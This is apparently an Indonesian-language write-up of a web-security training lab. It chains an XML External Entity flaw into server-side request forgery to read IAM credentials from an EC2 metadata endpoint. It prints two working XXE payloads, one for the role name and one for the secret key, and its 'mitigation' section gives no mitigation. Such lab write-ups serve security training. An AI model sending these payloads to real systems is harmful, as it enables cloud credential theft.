# Lab: Exploiting XXE to perform SSRF attacks

## Informasi Lab
* Nama Lab: Exploiting XXE to perform SSRF attacks
* Tingkat: APPRENTICE
* Tujuan: Mengeksploitasi kerentanan XML External Entity (XXE) untuk melancarkan serangan Server-Side Request Forgery (SSRF) guna mencuri kunci akses rahasia (IAM secret access key) dari endpoint metadata EC2.

## Ringkasan Kerentanan
Aplikasi ini memiliki fitur "Check stock" yang memproses input berformat XML dari pengguna. Parser XML di sisi server dikonfigurasi secara tidak aman, sehingga rentan terhadap serangan XML External Entity (XXE).

## Langkah-langkah Eksploitasi
1.  Menemukan Nama Peran IAM (IAM Role Name)
2.  Modifikasi Permintaan: Ubah body permintaan menjadi format XML dan suntikkan payload XXE pertama kita.
3.  Kirim & Analisis Respons: Kirim permintaan tersebut. Server akan merespons dengan nama peran IAM, yang akan muncul di dalam pesan error. Misalnya: admin

## Injeksi Payload 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

* Payload untuk mendapatkan kunci rahasia:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

## Kesimpulan dan Mitigasi
Lab ini berhasil dieksploitasi dengan merangkai kerentanan XXE untuk melakukan serangan SSRF, yang berujung pada pencurian kredensial cloud.

## Bukti
<img width="1211" height="660" alt="image" src="https://github.com/user-attachments/assets/b8542cb7-f243-48b2-951d-adca8091c746" />
<img width="990" height="436" alt="image" src="https://github.com/user-attachments/assets/79661c3f-f594-4bb1-886d-0e86b9b40ca3" />
<img width="1236" height="352" alt="image" src="https://github.com/user-attachments/assets/944fba8f-d7d0-4d46-a13d-72000c8de980" />
<img width="1176" height="525" alt="image" src="https://github.com/user-attachments/assets/6e863781-e089-4fb6-a01b-987170874d32" />
<img width="938" height="517" alt="image" src="https://github.com/user-attachments/assets/633679bb-09c8-41fd-8eb0-3f7528a4d55a" />

